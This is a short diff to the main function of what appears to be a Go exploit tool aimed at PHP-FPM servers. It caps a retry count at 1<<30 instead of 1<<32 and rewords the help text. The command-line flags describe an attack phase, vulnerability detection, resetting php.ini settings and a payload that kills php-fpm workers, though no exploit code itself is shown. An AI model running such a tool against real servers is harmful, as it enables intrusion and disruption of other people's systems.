@@ -44,7 +44,7 @@ func main() {
 					setting = m.PHPOptionDisable
 				}
 				if resetRetries == -1 {
-					resetRetries = 1 << 32
+					resetRetries = 1 << 30
 				}
 				if err := SetSetting(requester, params, setting, resetRetries); err != nil {
 					log.Fatalf("ResetSetting() returned error: %v", err)
@@ -113,7 +113,7 @@ func main() {
 	cmd.Flags().BoolVar(&skipAttack, "skip-attack", false, "skip attack phase")
 	cmd.Flags().BoolVar(&onlyQSL, "only-qsl", false, "stop after QSL detection, use this if you just want to check if the server is vulnerable")
 	cmd.Flags().BoolVar(&resetSetting, "reset-setting", false, "try to reset setting (requires attack params)")
-	cmd.Flags().IntVar(&resetRetries, "reset-retries", SettingEnableRetries, "how many retries to do for --reset-setting, -1 means 2**32")
+	cmd.Flags().IntVar(&resetRetries, "reset-retries", SettingEnableRetries, "how many retries to do for --reset-setting, -1 means a lot")
 	cmd.Flags().StringVar(&setting, "setting", "", "specify custom php.ini setting for --reset-setting")
 	cmd.Flags().BoolVar(&killWorkers, "kill-workers", false, "just kill php-fpm workers (requires only QSL)")
 	cmd.Flags().IntVar(&killCount, "kill-count", SettingEnableRetries, "how many times to send the worker killing payload")
